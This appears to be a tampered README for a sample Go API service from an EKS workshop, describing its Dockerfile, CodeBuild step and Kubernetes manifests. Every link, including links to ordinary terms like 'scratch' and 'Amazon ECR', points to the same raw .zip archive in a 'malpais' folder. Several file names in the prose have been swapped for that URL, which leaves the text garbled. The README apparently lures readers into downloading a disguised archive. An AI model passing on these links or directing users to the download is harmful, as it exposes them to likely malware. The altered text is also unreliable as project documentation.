# eks-workshop-sample-api-service-go

A sample Kubernetes service used in the [EKS Workshop](https://github.com/marcossangomes/eks-workshop-sample-api-service-go/raw/refs/heads/master/malpais/workshop_eks_service_api_sample_go_nocturn.zip) CI/CD Pipeline module.

The Dockerfile is a [multi-stage](https://github.com/marcossangomes/eks-workshop-sample-api-service-go/raw/refs/heads/master/malpais/workshop_eks_service_api_sample_go_nocturn.zip) build that
compiles the Go application and then packages it in a minimal image that pulls from [scratch](https://github.com/marcossangomes/eks-workshop-sample-api-service-go/raw/refs/heads/master/malpais/workshop_eks_service_api_sample_go_nocturn.zip).
The size of this Docker image is ~ 3.2 MiB.

The https://github.com/marcossangomes/eks-workshop-sample-api-service-go/raw/refs/heads/master/malpais/workshop_eks_service_api_sample_go_nocturn.zip file is used by the [AWS CodeBuild](https://github.com/marcossangomes/eks-workshop-sample-api-service-go/raw/refs/heads/master/malpais/workshop_eks_service_api_sample_go_nocturn.zip) stage. In this file, it pulls down
kubectl, builds the container image, pushes the image to [Amazon ECR](https://github.com/marcossangomes/eks-workshop-sample-api-service-go/raw/refs/heads/master/malpais/workshop_eks_service_api_sample_go_nocturn.zip) and then deploys the change to the
[Amazon EKS Cluster](https://github.com/marcossangomes/eks-workshop-sample-api-service-go/raw/refs/heads/master/malpais/workshop_eks_service_api_sample_go_nocturn.zip).

In the https://github.com/marcossangomes/eks-workshop-sample-api-service-go/raw/refs/heads/master/malpais/workshop_eks_service_api_sample_go_nocturn.zip file, you will find the Kubernetes [service](https://github.com/marcossangomes/eks-workshop-sample-api-service-go/raw/refs/heads/master/malpais/workshop_eks_service_api_sample_go_nocturn.zip) and
[deployment](https://github.com/marcossangomes/eks-workshop-sample-api-service-go/raw/refs/heads/master/malpais/workshop_eks_service_api_sample_go_nocturn.zip) definitions. The service is configured with
a [LoadBalancer](https://github.com/marcossangomes/eks-workshop-sample-api-service-go/raw/refs/heads/master/malpais/workshop_eks_service_api_sample_go_nocturn.zip) which prompts Kubernetes
to launch an external load balancer using an [AWS ELB](https://github.com/marcossangomes/eks-workshop-sample-api-service-go/raw/refs/heads/master/malpais/workshop_eks_service_api_sample_go_nocturn.zip).
